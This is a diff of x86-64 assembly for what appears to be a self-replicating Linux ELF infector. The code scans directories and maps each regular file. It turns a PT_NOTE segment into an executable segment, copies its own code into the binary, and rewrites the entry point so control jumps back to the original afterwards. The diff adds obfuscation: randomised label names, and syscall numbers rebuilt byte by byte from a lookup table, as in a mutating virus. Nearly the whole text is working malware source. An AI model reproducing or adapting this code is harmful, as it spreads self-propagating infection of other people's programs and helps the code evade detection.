@@ -8,26 +8,27 @@ section .text
 global _start
 
 _start:
-; placing EjCzV7zWv on the stack
+; placing vIpwyUO8 on the stack
 push rbp
 mov rbp, rsp
 PUSHA
-lea rdi, [rel GwMK34MPB4]     ; dir to open for arg readDir
-mov rsi, fyXEusC7
-call TgEV9uC7vZ
+call _map_int_table
+lea rdi, [rel AGG22EWL]     ; dir to open for arg readDir
+mov rsi, cQZDYf2Uk
+call HnbfY
 
-lea rdi, [rel I7PoMa]
-mov rsi, R608jI
-call TgEV9uC7vZ
-aVJvz6u:
+lea rdi, [rel PKN8uGw6P]
+mov rsi, wWXKWUc
+call HnbfY
+OM7Q6FJ:
 POPA
 mov rsp, rbp
 pop rbp
-vESv6z:
-jmp SPIuSsm
+Y8U3P:
+jmp mj9YXte
 
 ; take directory to open in rdi && size of pwd on rsi
-TgEV9uC7vZ:
+HnbfY:
 push rbp
 mov rbp, rsp
 push rax
@@ -36,155 +37,305 @@ call _decrypt_str
 mov rdi, rax
 pop rsi
 pop rax
-sub rsp, EjCzV7zWv_size
+sub rsp, vIpwyUO8_size
 push rsi
-lea r8, FAM(EjCzV7zWv.QpxZLmj)
+lea r8, FAM(vIpwyUO8.DmWCpO9p0X)
 or qword [r8], -1
-lea r8, FAM(EjCzV7zWv.pa98hvWY)
+lea r8, FAM(vIpwyUO8.JVrBRyDiHX)
 ; mov r10, [rdi]
 mov [r8], rdi
-lea r8, FAM(EjCzV7zWv.SJTK2)
+lea r8, FAM(vIpwyUO8.r6ieUyrMx)
 mov [r8], rsi
-mov rax, 0x2
+push r15
+push r14
+movq r15, xmm15
+movzx r14, byte [r15 + 32]
+shl r14, 0x18
+mov  rax, r14 
+movzx r14, byte [r15 + 92]
+shl r14, 0x10
+or  rax, r14 
+movzx r14, byte [r15 + 152]
+shl r14, 0x8
+or  rax, r14 
+movzx r14, byte [r15 + 212]
+or  rax, r14 
+pop r14
+pop r15
 mov rsi, 0x0000| O_DIRECTORY 
 xor rdx, rdx
 syscall
 cmp rax, 0 
-pop rsi        ; Get the pDTWFt7 size back to unmap
-jl uT8SHOJhBe
-lea rdi, FAM(EjCzV7zWv.QpxZLmj)             ; enregistre le QpxZLmj dans la struct
+pop rsi        ; Get the MVG2ahP0Fc size back to unmap
+jl tLme96eBX
+lea rdi, FAM(vIpwyUO8.DmWCpO9p0X)             ; enregistre le DmWCpO9p0X dans la struct
 mov [rdi], rax
 
-B2GG6:
-lea r10, FAM(EjCzV7zWv.QpxZLmj)
+c4jZtAVA:
+lea r10, FAM(vIpwyUO8.DmWCpO9p0X)
 mov rdi, [r10]
-lea r9, FAM(EjCzV7zWv.RwFtnZJB)              ; init RwFtnZJB
+lea r9, FAM(vIpwyUO8.gFNJOS)              ; init gFNJOS
+mov DWORD [r9], 0 
 push r15
 push r14
 movq r15, xmm15
-			movzx r14, byte [r15 + 1]
+movzx r14, byte [r15 + 49]
 shl r14, 0x18
-or DWORD [r9], r14D
-			movzx r14, byte [r15 + 36]
+mov  rax, r14 
+movzx r14, byte [r15 + 109]
 shl r14, 0x10
-or DWORD [r9],  r14D
-			movzx r14, byte [r15 + 71]
+or  rax, r14 
+movzx r14, byte [r15 + 169]
 shl r14, 0x8
-or DWORD [r9], r14D
-			movzx r14, byte [r15 + 106]
-or DWORD [r9], r14D
+or  rax, r14 
+movzx r14, byte [r15 + 229]
+or  rax, r14 
 pop r14
 pop r15
-mov rax, 0xd9
-lea rsi, FAM(EjCzV7zWv.W25WTT)
-mov rdx, 0x1000
+lea rsi, FAM(vIpwyUO8.TSyoY9O)
+push r15
+push r14
+movq r15, xmm15
+movzx r14, byte [r15 + 21]
+shl r14, 0x18
+mov  rdx, r14 
+movzx r14, byte [r15 + 81]
+shl r14, 0x10
+or  rdx, r14 
+movzx r14, byte [r15 + 141]
+shl r14, 0x8
+or  rdx, r14 
+movzx r14, byte [r15 + 201]
+or  rdx, r14 
+pop r14
+pop r15
 syscall
 cmp rax, 0 
-jle uT8SHOJhBe
+jle tLme96eBX
 
-lea r10, FAM(EjCzV7zWv.zvSUIpXjJ)  ; r10 -> (struct EjCzV7zWv.diretents_struct_ptr)
-mov [r10], rsi                           ; EjCzV7zWv.zvSUIpXjJ -> EjCzV7zWv.W25WTT
-lea r11, FAM(EjCzV7zWv.f1d0FF)       ; r11 -> (struct EjCzV7zWv.f1d0FF)
+lea r10, FAM(vIpwyUO8.yHYam1PN3q)  ; r10 -> (struct vIpwyUO8.diretents_struct_ptr)
+mov [r10], rsi                           ; vIpwyUO8.yHYam1PN3q -> vIpwyUO8.TSyoY9O
+lea r11, FAM(vIpwyUO8.gQwXpO)       ; r11 -> (struct vIpwyUO8.gQwXpO)
 mov DWORD [r11], eax 
 
-DESWn2Vn:
-lea r8, FAM(EjCzV7zWv.RwFtnZJB)        ; r8 -> total lu de getdents
-lea r9, FAM(EjCzV7zWv.f1d0FF)        ; r9 -> total a lire de getdents
-mov r10, FAM(EjCzV7zWv.zvSUIpXjJ)  ; r10 -> actual dirent struct
-lea r11, FAM(EjCzV7zWv.zvSUIpXjJ)  ; r11 -> ptr de la struct actuelle
+uiYOOLJ:
+lea r8, FAM(vIpwyUO8.gFNJOS)        ; r8 -> total lu de getdents
+lea r9, FAM(vIpwyUO8.gQwXpO)        ; r9 -> total a lire de getdents
+mov r10, FAM(vIpwyUO8.yHYam1PN3q)  ; r10 -> actual dirent struct
+lea r11, FAM(vIpwyUO8.yHYam1PN3q)  ; r11 -> ptr de la struct actuelle
 movzx r12, WORD [r10 + D_RECLEN_OFF] 
 add [r8], r12d                          ; update du total lu dans r8
-add [r11], r12                           ; EjCzV7zWv.diretns_struct_ptr -> sur la prochaine struct
+add [r11], r12                           ; vIpwyUO8.diretns_struct_ptr -> sur la prochaine struct
 cmp BYTE [r10 + D_TYPE], 0x8
-jne DL7EKmxq
+jne zTzKqKcV
 
-gU8MmO6Bp:
+zJUDpkNsU:
 lea rsi, [r10 + D_NAME] 
 mov byte [rsi - 1], '/'
-sub rsi, FAM(EjCzV7zWv.SJTK2)
-mov rdi, FAM(EjCzV7zWv.pa98hvWY)
-call KnAvt1mmz
+sub rsi, FAM(vIpwyUO8.r6ieUyrMx)
+mov rdi, FAM(vIpwyUO8.JVrBRyDiHX)
+call jzzLQ
 
-wNHaR:
-call VYY1vwvAk
+GRF2EB:
+call YKlp7Xhrmy
 
-DL7EKmxq:
-mov r8, FAM(EjCzV7zWv.RwFtnZJB)
-mov r12, FAM(EjCzV7zWv.f1d0FF)
+zTzKqKcV:
+mov r8, FAM(vIpwyUO8.gFNJOS)
+mov r12, FAM(vIpwyUO8.gQwXpO)
 cmp r8d, r12d                   ; if (total lu >= total getdents)
-mov rdi, FAM(EjCzV7zWv.pa98hvWY)
-mov rsi, FAM(EjCzV7zWv.SJTK2)
-jge B2GG6
-jmp DESWn2Vn
+mov rdi, FAM(vIpwyUO8.JVrBRyDiHX)
+mov rsi, FAM(vIpwyUO8.r6ieUyrMx)
+jge c4jZtAVA
+jmp uiYOOLJ
 
-VYY1vwvAk:
+YKlp7Xhrmy:
 push rbp
 mov rbp, rsp
-sub rsp, sdo0BysL8f_size
-lea rax, INF(sdo0BysL8f.kmMNfSQg)
+sub rsp, Hp2r39UiMa_size
+lea rax, INF(Hp2r39UiMa.dPrJVU)
 mov qword [rax], 0 
-lea rax, INF(sdo0BysL8f.gCa451)
+lea rax, INF(Hp2r39UiMa.lCqTjEOuD)
+mov byte [rax], 0 
+lea rax, INF(Hp2r39UiMa.Ic9xq)
+mov qword [rax], 0 
+
+Dg4isfxHc:
 push r15
 push r14
 movq r15, xmm15
-			movzx r14, byte [r15 + 1]
+movzx r14, byte [r15 + 32]
 shl r14, 0x18
-or byte [rax], r14b
-			movzx r14, byte [r15 + 36]
+mov  rax, r14 
+movzx r14, byte [r15 + 92]
 shl r14, 0x10
-or byte [rax],  r14b
-			movzx r14, byte [r15 + 71]
+or  rax, r14 
+movzx r14, byte [r15 + 152]
 shl r14, 0x8
-or byte [rax], r14b
-			movzx r14, byte [r15 + 106]
-or byte [rax], r14b
+or  rax, r14 
+movzx r14, byte [r15 + 212]
+or  rax, r14 
 pop r14
 pop r15
-lea rax, INF(sdo0BysL8f.jbuURm)
-mov qword [rax], 0 
-
-bjbis:
-mov rax, 0x2
 mov rdi, rsi
-mov rsi, 0x0002
+push r15
+push r14
+movq r15, xmm15
+movzx r14, byte [r15 + 52]
+shl r14, 0x18
+mov  rsi, r14 
+movzx r14, byte [r15 + 112]
+shl r14, 0x10
+or  rsi, r14 
+movzx r14, byte [r15 + 172]
+shl r14, 0x8
+or  rsi, r14 
+movzx r14, byte [r15 + 232]
+or  rsi, r14 
+pop r14
+pop r15
 xor rdx, rdx
 syscall
 cmp rax, 0x0 
-jl B8kVNDp5l
-mov INF(sdo0BysL8f.q7UhD3H7S), rax
+jl TEi4b7Y
+mov INF(Hp2r39UiMa.MAo60), rax
 
 ; === get file size ===
-vrNeOe:
-mov rax, 0x8
-mov rdi, INF(sdo0BysL8f.q7UhD3H7S)
-mov rsi, 0x0 
-mov rdx, 0x2
+EIXOrtpM:
+push r15
+push r14
+movq r15, xmm15
+movzx r14, byte [r15 + 46]
+shl r14, 0x18
+mov  rax, r14 
+movzx r14, byte [r15 + 106]
+shl r14, 0x10
+or  rax, r14 
+movzx r14, byte [r15 + 166]
+shl r14, 0x8
+or  rax, r14 
+movzx r14, byte [r15 + 226]
+or  rax, r14 
+pop r14
+pop r15
+mov rdi, INF(Hp2r39UiMa.MAo60)
+push r15
+push r14
+movq r15, xmm15
+movzx r14, byte [r15 + 1]
+shl r14, 0x18
+mov  rsi, r14 
+movzx r14, byte [r15 + 61]
+shl r14, 0x10
+or  rsi, r14 
+movzx r14, byte [r15 + 121]
+shl r14, 0x8
+or  rsi, r14 
+movzx r14, byte [r15 + 181]
+or  rsi, r14 
+pop r14
+pop r15
+push r15
+push r14
+movq r15, xmm15
+movzx r14, byte [r15 + 32]
+shl r14, 0x18
+mov  rdx, r14 
+movzx r14, byte [r15 + 92]
+shl r14, 0x10
+or  rdx, r14 
+movzx r14, byte [r15 + 152]
+shl r14, 0x8
+or  rdx, r14 
+movzx r14, byte [r15 + 212]
+or  rdx, r14 
+pop r14
+pop r15
 syscall
 cmp rax, 0x0 
-jle Edd7Xax
-mov INF(sdo0BysL8f.rRcDlhMrQ), rax
-mov INF(sdo0BysL8f.UKgLYq3), rax
+jle GmE4xR
+mov INF(Hp2r39UiMa.UFNesJv4q), rax
+mov INF(Hp2r39UiMa.Tdlff), rax
 
-we1HXFyH:
+VrW8XkdeW:
 ; rax -> map
 mov rsi, rax        ; rsi = file_size
-mov rax, 0x9
-mov rdi, 0x0 
+push r15
+push r14
+movq r15, xmm15
+movzx r14, byte [r15 + 36]
+shl r14, 0x18
+mov  rax, r14 
+movzx r14, byte [r15 + 96]
+shl r14, 0x10
+or  rax, r14 
+movzx r14, byte [r15 + 156]
+shl r14, 0x8
+or  rax, r14 
+movzx r14, byte [r15 + 216]
+or  rax, r14 
+pop r14
+pop r15
+push r15
+push r14
+movq r15, xmm15
+movzx r14, byte [r15 + 1]
+shl r14, 0x18
+mov  rdi, r14 
+movzx r14, byte [r15 + 61]
+shl r14, 0x10
+or  rdi, r14 
+movzx r14, byte [r15 + 121]
+shl r14, 0x8
+or  rdi, r14 
+movzx r14, byte [r15 + 181]
+or  rdi, r14 
+pop r14
+pop r15
 mov rdx, 0x2| 0x4| 0x1
-mov r10, 0x1
-mov r8, INF(sdo0BysL8f.q7UhD3H7S)
-mov r9, 0x0 
+push r15
+push r14
+movq r15, xmm15
+movzx r14, byte [r15 + 4]
+shl r14, 0x18
+mov  r10, r14 
+movzx r14, byte [r15 + 64]
+shl r14, 0x10
+or  r10, r14 
+movzx r14, byte [r15 + 124]
+shl r14, 0x8
+or  r10, r14 
+movzx r14, byte [r15 + 184]
+or  r10, r14 
+pop r14
+pop r15
+mov r8, INF(Hp2r39UiMa.MAo60)
+push r15
+push r14
+movq r15, xmm15
+movzx r14, byte [r15 + 1]
+shl r14, 0x18
+mov  r9, r14 
+movzx r14, byte [r15 + 61]
+shl r14, 0x10
+or  r9, r14 
+movzx r14, byte [r15 + 121]
+shl r14, 0x8
+or  r9, r14 
+movzx r14, byte [r15 + 181]
+or  r9, r14 
+pop r14
+pop r15
 syscall
 cmp rax, 0x0 
-jl Edd7Xax
-lea r8, INF(sdo0BysL8f.PEi4ySPjb2)
+jl GmE4xR
+lea r8, INF(Hp2r39UiMa.pNsDtvOr)
 mov [r8], rax
 
-QfCmx0rnIo:
+nq579qu6Fg:
 cmp dword [rax + 1], 0x02464c45 
-jne z25PPq
+jne KPfZtUUwNJ
 
-RPcaTtZ:
+Nyl73ugQ2H:
 ; rax == total segment number
 ; r9 == injection offset
 ; r13 == original segment end offset
@@ -192,113 +343,128 @@ RPcaTtZ:
 ; r15 -> map
 mov r15, rax
 mov r14, r15
-add r14, [r14 + pRBkUrO5.PpDoFWp]
+add r14, [r14 + h2viU9O.P4fER3Gm8m]
 xor rcx, rcx
-ebEwF:
-cmp cx, [r15  + pRBkUrO5.Df0PttR7O]
-jge B8LrSYf 
-add r14, KlRU8_size
+lh4wW:
+cmp cx, [r15  + h2viU9O.h2FSBoG]
+jge KTgop9K2DP 
+add r14, qtnMX2NULe_size
 inc rcx
-jmp ebEwF
-B8LrSYf:
-mov INF(sdo0BysL8f.r27Xqje), r14
+jmp lh4wW
+KTgop9K2DP:
+mov INF(Hp2r39UiMa.r7B5uVRYUF), r14
 xor r9, r9
-BzJLd8HuO:
+mqcBnBta:
 cmp cx, 0 
-jle am74G
-LoGTWkJof:
+jle ZMUZyTnMG
+T6MdiI6:
 bt word [r14], 0 
-jnc FG4L6
+jnc KZlSfCdiHe
 bt qword [r14], 0x20 
-jc J24tHS9
-FG4L6:
+jc fnlvnZ
+KZlSfCdiHe:
 dec rcx
-sub r14, KlRU8_size
-jmp BzJLd8HuO
+sub r14, qtnMX2NULe_size
+jmp mqcBnBta
 
-am74G:
-mov r9, INF(sdo0BysL8f.kmMNfSQg)
+ZMUZyTnMG:
+mov r9, INF(Hp2r39UiMa.dPrJVU)
 cmp r9, 0 
-je z25PPq
-cmp byte INF(sdo0BysL8f.gCa451), 1 
-je SekEeiZlc
-jmp wNY349I          ; else jmp wNY349I
+je KPfZtUUwNJ
+cmp byte INF(Hp2r39UiMa.lCqTjEOuD), 1 
+je I9FVgzQC
+jmp VjVbY4PaF          ; else jmp VjVbY4PaF
 
-J24tHS9:
+fnlvnZ:
 ; Check if the segment signed, else check the size, if big enough save the offsets if not already done
-p7q2p2:
-; r8 -> potential oipSFt
-; r9 == oipSFt variable
+DAWe8rZPe:
+; r8 -> potential hrQyImQKGS
+; r9 == hrQyImQKGS variable
 mov r8, r15
-add r8, [r14 + KlRU8.KY1FY]
-add r8, [r14 + KlRU8.zIxMP2]
-sub r8, KEuiL
-; mov r9, [rel oipSFt]
-lea r9, oipSFt
+add r8, [r14 + qtnMX2NULe.BYNKkr]
+add r8, [r14 + qtnMX2NULe.Hhvm9Q0pHM]
+sub r8, tl4Qd
+; mov r9, [rel hrQyImQKGS]
+lea r9, hrQyImQKGS
 ; mov rdi, r9
-; mov rsi, KEuiL
+; mov rsi, tl4Qd
 ; push rax
 ; call _decrypt_str
 ; mov r9, rax
 ; pop rax
 mov r10, [r9]
 cmp qword r10, [r8]
-je z25PPq
+je KPfZtUUwNJ
 mov rdi, r9
-mov rsi, KEuiL
+mov rsi, tl4Qd
 push rcx
-call hJjRO
+call PoZPrnQH
 pop rcx
 
-ToexAg:
-mov r9, INF(sdo0BysL8f.kmMNfSQg)
+hwxXOleu8:
+mov r9, INF(Hp2r39UiMa.dPrJVU)
 test r9, r9
-jz MyHlc
-mov r9, INF(sdo0BysL8f.gCa451)
+jz jAnJDmS
+mov r9, INF(Hp2r39UiMa.lCqTjEOuD)
 test r9, r9
-jz FG4L6
+jz KZlSfCdiHe
 
-MyHlc:
-; r8 == end of sdo0BysL8f offset
+jAnJDmS:
+; r8 == end of Hp2r39UiMa offset
 ; r9 == next segment offset
-mov r8, [r14 + KlRU8.KY1FY]
-add r8, [r14 + KlRU8.zIxMP2]
+mov r8, [r14 + qtnMX2NULe.BYNKkr]
+add r8, [r14 + qtnMX2NULe.Hhvm9Q0pHM]
 mov r13, r8        ; save segment end's offset
 add r8, CODE_LEN 
 mov r9, r14
-add r9, KlRU8_size
-add r9, KlRU8.KY1FY
+add r9, qtnMX2NULe_size
+add r9, qtnMX2NULe.BYNKkr
 cmp [r9], r8
-setb INF(sdo0BysL8f.gCa451)   ; if ([r9] < r8) { sdo0BysL8f.gCa451 = 1) }
+setb INF(Hp2r39UiMa.lCqTjEOuD)   ; if ([r9] < r8) { Hp2r39UiMa.lCqTjEOuD = 1) }
 
-yp1EJlf6Ql:
-; r8 -> sdo0BysL8f structure members
+M1h6UqTg:
+; r8 -> Hp2r39UiMa structure members
 ; r9 == injection address
 ; r12 == original entrypoint
-;*r13 == segment end's offset (MyHlc)
+;*r13 == segment end's offset (jAnJDmS)
 ;*r14 -> segment header in header table
-lea r8, INF(sdo0BysL8f.CxsCJPQD)
+lea r8, INF(Hp2r39UiMa.VeISq2)
 mov [r8], cl
-lea r8, INF(sdo0BysL8f.ZF0R4vA)
-mov r12, [r15 + pRBkUrO5.jPUACXO4wu]
+lea r8, INF(Hp2r39UiMa.vAk49lW)
+mov r12, [r15 + h2viU9O.XNvDp]
 mov [r8], r12
-lea r8, INF(sdo0BysL8f.kmMNfSQg)
+lea r8, INF(Hp2r39UiMa.dPrJVU)
 mov [r8], r13
-lea r8, INF(sdo0BysL8f.gzUNX)
+lea r8, INF(Hp2r39UiMa.R44md3)
 push r9
-mov r9, [r14 + KlRU8.hMiLM8]
-add r9, [r14 + KlRU8.SZmjGzMVKM]
+mov r9, [r14 + qtnMX2NULe.kdixMj]
+add r9, [r14 + qtnMX2NULe.tEUTYFr8]
 mov [r8], r9
 pop r9
-lea r8, INF(sdo0BysL8f.URL1aZ)
+lea r8, INF(Hp2r39UiMa.CheopBjw)
 mov [r8], r14
-jmp FG4L6
+jmp KZlSfCdiHe
 
-SekEeiZlc:
-hPJNX:
-mov rax, 0x4d
-mov rdi, INF(sdo0BysL8f.q7UhD3H7S)
-lea rsi, INF(sdo0BysL8f.rRcDlhMrQ)
+I9FVgzQC:
+cX2uppDQGt:
+push r15
+push r14
+movq r15, xmm15
+movzx r14, byte [r15 + 48]
+shl r14, 0x18
+mov  rax, r14 
+movzx r14, byte [r15 + 108]
+shl r14, 0x10
+or  rax, r14 
+movzx r14, byte [r15 + 168]
+shl r14, 0x8
+or  rax, r14 
+movzx r14, byte [r15 + 228]
+or  rax, r14 
+pop r14
+pop r15
+mov rdi, INF(Hp2r39UiMa.MAo60)
+lea rsi, INF(Hp2r39UiMa.UFNesJv4q)
 push qword [rsi]
 add qword [rsi], 0x1000
 and qword [rsi], -4096
@@ -307,202 +473,322 @@ mov rsi, [rsi]
 syscall
 pop rsi
 cmp rax, 0 
-jl z25PPq
+jl KPfZtUUwNJ
 
-e3U0lYwbpj:
-mov rdi, INF(sdo0BysL8f.PEi4ySPjb2)
-mov rax, 0xb
+ziFjFIavvm:
+mov rdi, INF(Hp2r39UiMa.pNsDtvOr)
+push r15
+push r14
+movq r15, xmm15
+movzx r14, byte [r15 + 47]
+shl r14, 0x18
+mov  rax, r14 
+movzx r14, byte [r15 + 107]
+shl r14, 0x10
+or  rax, r14 
+movzx r14, byte [r15 + 167]
+shl r14, 0x8
+or  rax, r14 
+movzx r14, byte [r15 + 227]
+or  rax, r14 
+pop r14
+pop r15
 syscall
 
-DtjuvoA:
-mov rax, 0x9
-mov rdi, 0x0 
-mov rsi, INF(sdo0BysL8f.rRcDlhMrQ)    ; rsi = file_size
+k24kb:
+push r15
+push r14
+movq r15, xmm15
+movzx r14, byte [r15 + 36]
+shl r14, 0x18
+mov  rax, r14 
+movzx r14, byte [r15 + 96]
+shl r14, 0x10
+or  rax, r14 
+movzx r14, byte [r15 + 156]
+shl r14, 0x8
+or  rax, r14 
+movzx r14, byte [r15 + 216]
+or  rax, r14 
+pop r14
+pop r15
+push r15
+push r14
+movq r15, xmm15
+movzx r14, byte [r15 + 1]
+shl r14, 0x18
+mov  rdi, r14 
+movzx r14, byte [r15 + 61]
+shl r14, 0x10
+or  rdi, r14 
+movzx r14, byte [r15 + 121]
+shl r14, 0x8
+or  rdi, r14 
+movzx r14, byte [r15 + 181]
+or  rdi, r14 
+pop r14
+pop r15
+mov rsi, INF(Hp2r39UiMa.UFNesJv4q)    ; rsi = file_size
 mov rdx, 0x2| 0x4| 0x1
-mov r10, 0x1
-mov r8, INF(sdo0BysL8f.q7UhD3H7S)
-mov r9, 0x0 
+push r15
+push r14
+movq r15, xmm15
+movzx r14, byte [r15 + 4]
+shl r14, 0x18
+mov  r10, r14 
+movzx r14, byte [r15 + 64]
+shl r14, 0x10
+or  r10, r14 
+movzx r14, byte [r15 + 124]
+shl r14, 0x8
+or  r10, r14 
+movzx r14, byte [r15 + 184]
+or  r10, r14 
+pop r14
+pop r15
+mov r8, INF(Hp2r39UiMa.MAo60)
+push r15
+push r14
+movq r15, xmm15
+movzx r14, byte [r15 + 1]
+shl r14, 0x18
+mov  r9, r14 
+movzx r14, byte [r15 + 61]
+shl r14, 0x10
+or  r9, r14 
+movzx r14, byte [r15 + 121]
+shl r14, 0x8
+or  r9, r14 
+movzx r14, byte [r15 + 181]
+or  r9, r14 
+pop r14
+pop r15
 syscall
 cmp rax, 0x0 
-jl Edd7Xax
-lea r8, INF(sdo0BysL8f.PEi4ySPjb2)
+jl GmE4xR
+lea r8, INF(Hp2r39UiMa.pNsDtvOr)
 mov [r8], rax
 
-MAGQ1nsn:
-mov r14, INF(sdo0BysL8f.PEi4ySPjb2)
-movzx rax, word [r14 + pRBkUrO5.o64cTvXn]
-add r14, [r14 + pRBkUrO5.GcnemzIA]
+Vab9IlH2j:
+mov r14, INF(Hp2r39UiMa.pNsDtvOr)
+movzx rax, word [r14 + h2viU9O.aoWnmX]
+add r14, [r14 + h2viU9O.pCtMgY]
 xor rcx, rcx
 
-DETWez:
+FxgpZQW:
 cmp rcx, rax
-jge A4wnlB
-mov rbx, [r14 + i1swc.SUJg152kSB]
-add rbx, [r14 + i1swc.ewzLE]
-cmp INF(sdo0BysL8f.jbuURm), rbx
-jge q16Kd
-mov INF(sdo0BysL8f.jbuURm), rbx
+jge i8EwVy
+mov rbx, [r14 + PNvMO0.XSvoqKsb]
+add rbx, [r14 + PNvMO0.qjUZ9VvHE]
+cmp INF(Hp2r39UiMa.Ic9xq), rbx
+jge gPXJd
+mov INF(Hp2r39UiMa.Ic9xq), rbx
 
-q16Kd:
-add r14, i1swc_size
+gPXJd:
+add r14, PNvMO0_size
 inc rcx
-jmp DETWez
+jmp FxgpZQW
 
-A4wnlB:
+i8EwVy:
 
-TZui2C:
+QaVOLl:
 ; r14 -> segmentS header
 ; rcx == segment counter
-mov r14, INF(sdo0BysL8f.PEi4ySPjb2)
-movzx rax, word [r14 + pRBkUrO5.Df0PttR7O]
-add r14, [r14 + pRBkUrO5.PpDoFWp]
+mov r14, INF(Hp2r39UiMa.pNsDtvOr)
+movzx rax, word [r14 + h2viU9O.h2FSBoG]
+add r14, [r14 + h2viU9O.P4fER3Gm8m]
 xor rcx, rcx
 
-gvGG2v:
+tOj9ySF:
 cmp rcx, rax
-jge dSxvCa
-cmp dword [r14 + KlRU8.xXBiSq], 0x4
-je DLLhns
+jge DFqzY
+cmp dword [r14 + qtnMX2NULe.ngVI1xF], 0x4
+je l28dBdvpAF
 
-XQTBLwN:
-add r14, KlRU8_size
+EHS0M:
+add r14, qtnMX2NULe_size
 inc rcx
-jmp gvGG2v
+jmp tOj9ySF
 
-dSxvCa:
+DFqzY:
 mov r14, -1 
 
-DLLhns:
+l28dBdvpAF:
 ; r14 -> segment header
 ; rax == new offset / address
 cmp r14, 0 
-jl bXSqw5dG
-mov dword [r14 + KlRU8.xXBiSq], 0x1
-mov qword [r14 + KlRU8.Gpf3h00m3], 0x1| 0x4
-mov qword [r14 + KlRU8.zIxMP2], CODE_LEN 
-mov qword [r14 + KlRU8.SZmjGzMVKM], CODE_LEN 
-mov qword [r14 + KlRU8.unJFClezF], 0x1000 
-mov rax, INF(sdo0BysL8f.UKgLYq3)
+jl zDse7
+mov dword [r14 + qtnMX2NULe.ngVI1xF], 0x1
+mov qword [r14 + qtnMX2NULe.a28Bo], 0x1| 0x4
+mov qword [r14 + qtnMX2NULe.Hhvm9Q0pHM], CODE_LEN 
+mov qword [r14 + qtnMX2NULe.tEUTYFr8], CODE_LEN 
+mov qword [r14 + qtnMX2NULe.u2fIzVy], 0x1000 
+mov rax, INF(Hp2r39UiMa.Tdlff)
 add rax, 0x1000 
 and rax, -4096
-mov qword [r14 + KlRU8.KY1FY], rax
-mov qword INF(sdo0BysL8f.kmMNfSQg), rax
-mov rax, INF(sdo0BysL8f.jbuURm)
+mov qword [r14 + qtnMX2NULe.BYNKkr], rax
+mov qword INF(Hp2r39UiMa.dPrJVU), rax
+mov rax, INF(Hp2r39UiMa.Ic9xq)
 add rax, 0x1000 
 and rax, -4096
-mov qword INF(sdo0BysL8f.gzUNX), rax
-mov qword [r14 + KlRU8.hMiLM8], rax
-mov qword [r14 + KlRU8.eaXpnLdaO7], rax
+mov qword INF(Hp2r39UiMa.R44md3), rax
+mov qword [r14 + qtnMX2NULe.kdixMj], rax
+mov qword [r14 + qtnMX2NULe.mh61y], rax
 
-wNY349I:
-gFRDsBehV8:
+VjVbY4PaF:
+duditwbLa:
 ; r8 -> elf header entrypoint
 ; r9 == end of segment + align (injection offset)
 ; r10 == injection offset
-mov r8, INF(sdo0BysL8f.PEi4ySPjb2)
-add r8, pRBkUrO5.jPUACXO4wu
-mov r10, INF(sdo0BysL8f.gzUNX)
+mov r8, INF(Hp2r39UiMa.pNsDtvOr)
+add r8, h2viU9O.XNvDp
+mov r10, INF(Hp2r39UiMa.R44md3)
 mov [r8], r10
-cmp byte INF(sdo0BysL8f.gCa451), 0 
-jg KJXndUge
+cmp byte INF(Hp2r39UiMa.lCqTjEOuD), 0 
+jg p1hbaxkOK
 mov rdi, CODE_LEN 
-call VRVNdP
+call BLp89WFxH
 
-KJXndUge:
+p1hbaxkOK:
 ; rdi -> injection start
 ; rsi -> parasite _start
-; rcx == code len (gLj4boEu - _start)
-mov rdi, INF(sdo0BysL8f.PEi4ySPjb2)
-add rdi, INF(sdo0BysL8f.kmMNfSQg)
+; rcx == code len (sffRnF - _start)
+mov rdi, INF(Hp2r39UiMa.pNsDtvOr)
+add rdi, INF(Hp2r39UiMa.dPrJVU)
 lea rsi, [rel _start]     ; rsi -> start of our code
 mov rcx, CODE_LEN 
-cld          ; copy from _start to gLj4boEu (= !std)
+cld          ; copy from _start to sffRnF (= !std)
 rep movsb
 
-bXSqw5dG:
-; r8 -> vESv6z instruction's addr (vESv6z + 1)
+zDse7:
+; r8 -> Y8U3P instruction's addr (Y8U3P + 1)
 ; r9 == distance to jump from final jump to original entry point
-mov r8, INF(sdo0BysL8f.PEi4ySPjb2)
-add r8, INF(sdo0BysL8f.kmMNfSQg)
+mov r8, INF(Hp2r39UiMa.pNsDtvOr)
+add r8, INF(Hp2r39UiMa.dPrJVU)
 add r8, FINJMP_OFF 
 inc r8
-mov r10, INF(sdo0BysL8f.gzUNX)
+mov r10, INF(Hp2r39UiMa.R44md3)
 add r10, FINJMP_OFF 
 add r10, 0x05 
-mov r9, INF(sdo0BysL8f.ZF0R4vA)
+mov r9, INF(Hp2r39UiMa.vAk49lW)
 sub r9, r10
 mov [r8], r9d
-jmp z25PPq
+jmp KPfZtUUwNJ
 
-VRVNdP:
+BLp89WFxH:
 ; r8 -> segment header data
 ;*r14 -> segment header in header table
 
-mov r8, INF(sdo0BysL8f.URL1aZ)
+mov r8, INF(Hp2r39UiMa.CheopBjw)
 push r8           ; save header start for later
 
 ; * Update file size *
-add r8, qword KlRU8.zIxMP2
+add r8, qword qtnMX2NULe.Hhvm9Q0pHM
 add qword [r8], rdi
 pop r8
 
 ; * Update memory size *
-add r8, KlRU8.SZmjGzMVKM
+add r8, qtnMX2NULe.tEUTYFr8
 add qword [r8], rdi
 
 ret
 
-z25PPq:
-lea rdi, INF(sdo0BysL8f.PEi4ySPjb2)
-lea rsi, INF(sdo0BysL8f.rRcDlhMrQ)
-call hJjRO
-jmp Edd7Xax
+KPfZtUUwNJ:
+lea rdi, INF(Hp2r39UiMa.pNsDtvOr)
+lea rsi, INF(Hp2r39UiMa.UFNesJv4q)
+call PoZPrnQH
+jmp GmE4xR
 
-hJjRO:
-mov rax, 0xb
+PoZPrnQH:
+push r15
+push r14
+movq r15, xmm15
+movzx r14, byte [r15 + 47]
+shl r14, 0x18
+mov  rax, r14 
+movzx r14, byte [r15 + 107]
+shl r14, 0x10
+or  rax, r14 
+movzx r14, byte [r15 + 167]
+shl r14, 0x8
+or  rax, r14 
+movzx r14, byte [r15 + 227]
+or  rax, r14 
+pop r14
+pop r15
 syscall
 ret
 
-Edd7Xax:
-mov rax, 0x3
-mov rdi, INF(sdo0BysL8f.q7UhD3H7S)
+GmE4xR:
+push r15
+push r14
+movq r15, xmm15
+movzx r14, byte [r15 + 33]
+shl r14, 0x18
+mov  rax, r14 
+movzx r14, byte [r15 + 93]
+shl r14, 0x10
+or  rax, r14 
+movzx r14, byte [r15 + 153]
+shl r14, 0x8
+or  rax, r14 
+movzx r14, byte [r15 + 213]
+or  rax, r14 
+pop r14
+pop r15
+mov rdi, INF(Hp2r39UiMa.MAo60)
 syscall
-mov qword INF(sdo0BysL8f.q7UhD3H7S), -1
